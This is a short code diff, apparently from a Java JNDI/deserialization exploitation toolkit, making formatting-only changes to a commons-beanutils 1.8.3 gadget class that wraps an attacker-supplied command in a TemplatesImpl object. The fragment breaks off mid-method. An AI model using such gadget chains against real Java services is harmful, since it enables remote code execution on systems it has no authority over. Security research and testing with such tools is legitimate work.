@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -16,15 +15,14 @@ import java.util.Comparator;
 import java.util.PriorityQueue;
 
 
-
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "org.apache.commons:commons-lang3:3.10"})
 @Authors({"SummerSec"})
-public class CommonsBeanutilsObjectToStringComparator183 implements ObjectPayload<Object>{
+public class CommonsBeanutilsObjectToStringComparator183 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
-        ClassPool    pool     = ClassPool.getDefault();
+        ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
         final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
         try {
